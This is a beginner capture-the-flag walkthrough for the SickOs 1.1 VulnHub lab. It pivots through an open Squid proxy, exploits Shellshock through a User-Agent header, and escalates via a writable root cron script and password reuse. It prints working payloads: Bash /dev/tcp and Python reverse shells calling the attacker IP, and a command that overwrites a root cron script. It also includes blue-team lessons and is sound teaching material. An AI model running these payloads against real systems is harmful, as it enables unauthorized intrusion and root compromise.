# SickOs: 1.1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | SickOs: 1.1 |
| **Difficulty** | Easy / Intermediate |
| **Author** | D4rk |
| **Released** | December 11, 2015 |
| **VulnHub Entry** | [SickOs: 1.1 on VulnHub](https://vulnhub.com/entry/sickos-11,132/) |
| **Download** | [SickOs: 1.1 OVA](https://vulnhub.com/entry/sickos-11,132/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu 12.04 era) |

> **Goal:** get `root` and read the flag in `/root/a0216ea4d51874464078c618298b1367.txt`.
> **Note on IPs:** the target IP varies by build. This guide uses `192.168.56.101` as the example target and `192.168.56.10` as the example attacker. Replace both with the addresses you actually discover.

## 0. What you will learn

- **Proxy pivoting:** how an open Squid proxy on port 3128 lets you (and your tools) reach a web server that is *not* directly exposed.
- **Port scanning through a proxy:** using Nmap, Metasploit, or a small scanner to map services hidden behind the proxy.
- **Shellshock (CVE-2014-6271):** what the Bash environment-variable bug is, and why CGI scripts are the classic target.
- **Exploiting via HTTP headers:** injecting a payload into `User-Agent` / `Referer` so Apache hands it to Bash.
- **Reverse shells:** converting command execution into a stable interactive shell.
- **Cron-job privilege escalation:** a root cron job running a world-writable script every minute.
- **Password reuse:** the same DB password working for an OS account — and that account having `sudo ALL`.
- **Defensive thinking:** how each finding would be prevented in a real environment.

## 1. Reconnaissance — finding the target

Find your own IP and the target's IP on the lab network.

**Check your (attacker) IP:**
```bash
ip a
```

> **How to read it:** Shows your interfaces. The `192.168.56.x` address on your host-only/NAT interface is your attacker IP (here `192.168.56.10`).

**Discover live hosts:**

> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --localnet
# or
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

> **How to read it:** A new Linux host on the subnet is your SickOs VM. Confirm it responds:
```bash
ping -c 2 192.168.56.101
```

![host discovery showing the target IP](images/01-recon.png)


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services

### 2.1 Service scan

> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- --min-rate 1000 -T4 -oA scans/full 192.168.56.101
```

Realistic output (exact banners may vary by build):
```text
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
```

> **How to read it:** Only two ports answer directly: SSH (22) and a **Squid HTTP proxy** (3128). There is no web server visible on port 80 yet.
> **Why it works:** Squid on 3128 means the box is acting as a forward proxy. If it is misconfigured to allow anyone to use it, we can **pivot** through it and reach services bound to `localhost` — including a web server we cannot see directly.

### 2.2 The proxy reveals a hidden web server
Set your browser (or `curl`) to use the proxy and request the target's own `localhost`:
```bash
curl --proxy http://192.168.56.101:3128 http://127.0.0.1/
```

> **Why it works:** The request goes *from the target* to `127.0.0.1`, so it reaches services only listening on the loopback interface. A page comes back — there is a web server on port 80 that was invisible in our direct scan.
> If the connection is refused, the proxy may be restricting which ports it will forward; try the explicit port (`http://127.0.0.1:80/`).

Port-scan the loopback through the proxy to find all hidden ports:
```bash
nmap --proxy http://192.168.56.101:3128 -sT -Pn -p 22,80,631,3306 127.0.0.1
```

> **How to read it:** `--proxy` sends Nmap's TCP connect scans through Squid. This typically reveals **80** (web), **631** (CUPS printing), and **3306** (MySQL) that a normal external scan missed.
> **Why it works:** `-sT` (connect scan) works over a proxy because Squid performs the actual TCP connection on our behalf.

![Squid proxy revealing the internal web server](images/02-proxy-pivot.png)

### 2.3 Enumerate the hidden web server (through the proxy)
Brute-force directories via the proxy:

> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
gobuster dir --proxy http://192.168.56.101:3128 -u http://127.0.0.1/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
```text
/cgi-bin/            (Status: 403)
/index.php           (Status: 200)
/robots.txt          (Status: 200)
/server-status       (Status: 200)
```

Check `robots.txt`:
```bash
curl --proxy http://192.168.56.101:3128 http://127.0.0.1/robots.txt
```
```text
User-agent: *
Disallow: /wolfcms
```

> **How to read it:** `robots.txt` hides a `/wolfcms` CMS installation. Directory listing of `/cgi-bin/` is enabled, and `/server-status` (an Apache status page) is exposed.

Run Nikto through the proxy:
```bash
nikto -h http://127.0.0.1/ -useproxy http://192.168.56.101:3128
```
```text
+ Server: Apache/2.2.22 (Ubuntu)
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (CVE-2014-6278).
```

> **Why it works:** `/cgi-bin/status` is a CGI script. CGI scripts often run under Bash, and Nikto has fingerprinting that detects the Shellshock vulnerability. A request to that path returns the output of commands like `uptime` and `uname -a`.

![Nikto reporting Shellshock in /cgi-bin/status](images/03-nikto-shellshock.png)

## 3. Foothold — Shellshock

### 3.1 What is Shellshock?
Bash lets you define functions via environment variables. In vulnerable versions (Bash ≤ 4.3), if an environment variable contains a function definition followed by extra commands, Bash **executes those extra commands**. Before running a CGI script, Apache copies HTTP headers (such as `User-Agent` and `Referer`) into environment variables. Those headers are fully attacker-controlled — so we can smuggle a command in.

> **Why it works:** We do not need any credentials. Any header Apache passes to the CGI script is a potential injection point. The classic CVE is **CVE-2014-6271** (and the related **CVE-2014-6278**).

### 3.2 Prove command execution
Send a request whose `User-Agent` contains a payload that runs `id`:
```bash
curl --proxy http://192.168.56.101:3128 http://127.0.0.1/cgi-bin/status \
  -H "User-Agent: () { :;}; echo; echo; /usr/bin/id"
```

Realistic response (the JSON output is polluted by our command output):
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{"uptime":"...","uname":"Linux SickOs ..."}
```

> **How to read it:** `uid=33(www-data)` proves our injected command executed as the web user. The `() { :;}` part defines an empty Bash function; the `;` and everything after is the injected command.
> Some builds respond better with the `Referer` header or the newer `() { :;};` syntax — try both if needed.

### 3.3 Get a reverse shell
Start a listener:

> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -lvnp 443
```

Send the payload. A simple Bash reverse shell works well:
```bash
curl --proxy http://192.168.56.101:3128 http://127.0.0.1/cgi-bin/status \
  -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/192.168.56.10/443 0>&1"
```

> **Why it works:** `/dev/tcp/host/port` is a Bash feature that opens a TCP socket. `>&` duplicates the socket onto stdout/stderr, so the target's shell connects back to our listener on port 443. The proxy carries the malicious request; the *shell connection itself goes directly* from target to attacker.

Listener output:
```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 59312
bash: no job control in this shell
www-data@SickOs:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Note:** if the bash shell payload does not connect, generate an equivalent with `msfvenom -p cmd/unix/reverse_bash LHOST=192.168.56.10 LPORT=443 -f raw` (and change `sh` to `/bin/sh` if needed), or use a Python reverse shell.

![Shellshock reverse shell as www-data](images/04-shellshock-shell.png)


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — www-data to root

There are two well-known paths. Both are worth knowing.

### 4.1 Path A — root cron job running a writable script
List the cron directories:
```bash
ls -la /etc/cron.d/
cat /etc/cron.d/automate
```
```text
* * * * * root /usr/bin/python /var/www/connect.py
```

> **How to read it:** A cron job runs `/usr/bin/python /var/www/connect.py` **every minute as root**. Check the script's permissions:
```bash
ls -la /var/www/connect.py
```
> If `www-data` can write to it, we replace its contents with a Python reverse shell. When cron runs it as root a minute later, we get a root shell.

Overwrite the script with a Python reverse shell (single line):
```bash
echo "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('192.168.56.10',443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])" > /var/www/connect.py
```

> **Why it works:** Because the file is world-writable, `www-data` can change what root will execute. `connect.py` is normally just a harmless status script, but we control its contents.

Start another listener and wait up to a minute:
```bash
nc -lvnp 443
```
```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 46650
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** The cron daemon runs the job as `root` with no interactive login; the Python payload connects back and gives us a root shell.

### 4.2 Path B — password reuse → `sudo ALL`
The WolfCMS install stores database credentials in `config.php`:
```bash
cat /var/www/wolfcms/config.php
```
```text
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
```

Enumerate local users (`/etc/passwd`) — the only real user is `sickos`. Try the DB password for that account:
```bash
su - sickos      # password: john@123
```

> **Why it works:** The admin reused the database password for the OS user `sickos`. Now check what `sickos` can do:
```bash
sudo -l
```
```text
User sickos may run the following commands on this host:
    (ALL : ALL) ALL
```

> **How to read it:** `(ALL : ALL) ALL` means `sickos` may run **any** command as **any** user — including root:
```bash
sudo su -
```
```text
root@SickOs:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3 Capture the flag
```bash
ls -la /root
cat /root/a0216ea4d51874464078c618298b1367.txt
```
```text
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
```

> **Note:** the exact flag filename and text are specific to this VM, but confirm the contents on your own build — never assume.

![root shell and flag](images/05-root-flag.png)

## 5. Summary of vulnerabilities

| Vulnerability | CVE / Type | Component | Port(s) | Impact | Notes |
|---|---|---|---|---|---|
| Open Squid forward proxy | Misconfiguration | Squid 3.1.19 | 3128 | Network pivot to hidden services | Lets anyone reach `localhost`-bound services |
| Hidden web server / CMS | Misconfiguration | Apache 2.2.22, WolfCMS | 80 (via proxy) | Expands attack surface | `/robots.txt` leaks `/wolfcms` |
| Shellshock | CVE-2014-6271 / CVE-2014-6278 | Bash via Apache CGI | 80 (via proxy) | Remote Code Execution | `/cgi-bin/status` is the vector |
| Root cron running writable script | Misconfiguration | `/etc/cron.d/automate` → `/var/www/connect.py` | — | Local Privilege Escalation → root | World-writable script executed by root every minute |
| Credentials in web-readable file | Sensitive data exposure | `/var/www/wolfcms/config.php` | 80 | DB credentials (`root:john@123`) | Root of the CMS secret leak |
| Password reuse | Weak practice | OS account `sickos` | 22 | Account compromise | DB password reused for the user |
| Over-privileged sudo | Misconfiguration | `sickos` sudoers entry | — | Full root via `sudo su` | `(ALL : ALL) ALL` |

> **How to read it:** Two independent privilege-escalation paths exist by design — a world-writable root cron target and a reusable password plus unlimited `sudo`. Either one leads to root.

## 6. Defensive lessons (blue team)

- **Do not run an open proxy.** If Squid is required, restrict it with `acl` rules to trusted networks and disable forwarding to loopback/private ranges. An open proxy hides and exposes internal services.
- **Patch Bash.** Shellshock was fixed in Bash 4.3 patch 25 onwards; apply security updates across every host and container image.
- **Disable or harden CGI.** Prefer modern application servers over CGI. If you must use CGI, run it in a sandbox with minimal privileges and never pass raw HTTP headers into a shell.
- **Keep secrets out of the web root.** `config.php` should not be browsable and should not contain OS passwords.
- **Never reuse passwords** across databases, applications, and OS accounts. Use a secrets manager and unique credentials.
- **Apply least privilege to `sudo`.** Grant only the specific commands a user needs. `(ALL : ALL) ALL` for a service account is effectively root.
- **Protect cron-executed scripts.** They must be owned by root and **not writable** by non-root users. Audit scheduled jobs for path and permission issues.
- **Upload/serve files safely and monitor egress.** Reverse shells create outbound connections — alert on unexpected outbound traffic from servers.
- **Patch management and inventory:** document service versions (an ancient Squid, Apache, and OpenSSH are all patch-hygiene failures here).

## 7. References

Real community writeups consulted during research (same path):

- [SickOs 1.1 — Christophe Tafani-Dereeper](https://blog.christophetd.fr/write-up-sickos-1-1/)
- [SickOS 1.1 Walkthrough — highon.coffee / Arr0way](https://highon.coffee/blog/sickos-1-walkthrough/)
- [SickOS 1 – VulnHub Writeup — ziomsec](https://ziomsec.com/writeups/vulnhub/sickos-1.1/)
- [SickOs: 1.1 VulnHub Writeup — g0blin Research](https://g0blin.co.uk/sickos-1-1-vulnhub-writeup/)
- [Rooting SickOS 1.1 — phi10s](https://www.phi10s.com/2018/02/rooting-sickos-11.html)
- [VulnHub – SickOs: 1.1 – Writeup (OSCP Friendly) — Dr. P1ng](https://drp1ngblog.es/vulnhub-sickos-1-1-writeup-oscp-friendly/)
- [VulnHub Official Entry — SickOs: 1.1](https://vulnhub.com/entry/sickos-11,132/)

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — host discovery showing the target IP
- [ ] `images/02-proxy-pivot.png` — Squid proxy revealing the hidden web server
- [ ] `images/03-nikto-shellshock.png` — Nikto reporting Shellshock on `/cgi-bin/status`
- [ ] `images/04-shellshock-shell.png` — reverse shell as `www-data`
- [ ] `images/05-root-flag.png` — root shell and the flag file in `/root`

> **How to read it:** Put screenshots in `labs/sickos-11/images/` and reference them with relative paths as shown above.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
